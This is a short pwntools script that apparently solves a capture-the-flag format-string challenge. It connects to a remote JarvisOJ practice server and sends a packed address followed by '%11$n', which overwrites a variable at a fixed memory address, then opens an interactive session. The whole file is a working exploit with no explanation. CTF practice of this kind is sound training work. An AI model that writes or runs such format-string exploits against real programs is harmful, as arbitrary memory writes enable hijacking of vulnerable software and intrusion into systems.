from pwn import *

# sh = process('./fm')
sh = remote('pwn2.jarvisoj.com', '9895')

x_addr = 0x804a02c

payload = p32(x_addr) + "%11$n"

sh.sendline(payload)
sh.interactive()
sh.close()